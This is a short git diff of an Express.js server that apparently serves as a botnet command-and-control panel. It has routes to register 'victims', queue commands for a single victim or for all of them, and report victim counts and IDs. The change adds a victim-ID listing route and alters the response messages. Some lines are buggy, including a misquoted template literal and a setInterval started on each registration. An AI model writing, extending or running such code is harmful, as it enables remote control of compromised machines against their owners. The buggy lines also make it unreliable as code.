@@ -9,8 +9,10 @@ app.use(bodyparser.urlencoded({extended:true}));
 app.listen(PORT);
 
 const defaultCommand = "echo hello";
+let updateVictimCount = null;
 
 app.get("/registervictim/:victimID", (req, res) => {
+  setInterval(victimDB.updateVictimCount, 8000);
   victimDB.addVictim(req.params.victimID);
   res.send("");
 })
@@ -29,7 +31,7 @@ app.get("/command(/:victimID)?",(req, res) =>{
 
 app.get("/sendcommand/:command", (req, res) => {
   victimDB.addMassCommand(req.params.command);
-  res.send("Success");
+  res.send("Sent '`${req.params.command}`'");
 });
 
 app.post("/sendcommand", (req, res) => {
@@ -37,11 +39,15 @@ app.post("/sendcommand", (req, res) => {
   let command = req.body.command;
   target ? victimDB.addCommand(command, target) : victimDB.addMassCommand(command);
   console.log("Added: ",command);
-  res.send(command);
+  res.send("Sent:",command);
 });
 
 app.get("/victimcount", (req, res) => {
   res.send(""+victimDB.getVictimCount());
+});
+
+app.get("/victimids", (req, res) => {
+  res.send(victimDB.getVictimIDs());
 });
 
 app.use(express.static(__dirname + '/public/'));
